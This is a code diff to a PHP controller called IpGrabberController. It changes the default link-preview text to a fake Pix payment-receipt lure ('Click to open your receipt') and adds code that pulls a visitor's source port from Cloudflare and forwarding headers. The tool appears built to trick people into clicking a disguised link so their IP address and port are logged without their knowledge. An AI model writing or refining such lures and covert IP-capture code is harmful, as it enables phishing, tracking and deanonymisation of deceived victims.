@@ -311,7 +311,7 @@ class IpGrabberController extends Controller
         }
 
         if (! $ipGrabber->og_descricao) {
-            $updates['og_descricao'] = 'Abra o comprovante para confirmar sua chave pix';
+            $updates['og_descricao'] = 'Clique para abrir seu comprovante.';
         }
 
         if ($updates) {
@@ -679,6 +679,20 @@ class IpGrabberController extends Controller
 
     private function resolverPortaOrigem(Request $request): ?string
     {
+        if ($request->headers->has('CF-Connecting-IP')) {
+            foreach (['CF-Connecting-Port', 'True-Client-Port'] as $header) {
+                if ($porta = $this->normalizarPorta($request->headers->get($header))) {
+                    return $porta;
+                }
+            }
+
+            if ($porta = $this->portaNoXForwardedFor($request->headers->get('X-Forwarded-For'))) {
+                return $porta;
+            }
+
+            return null;
+        }
+
         foreach (['X-Forwarded-Client-Port', 'X-Client-Port', 'X-Real-Port', 'CF-Connecting-Port', 'True-Client-Port'] as $header) {
             if ($porta = $this->normalizarPorta($request->headers->get($header))) {
                 return $porta;
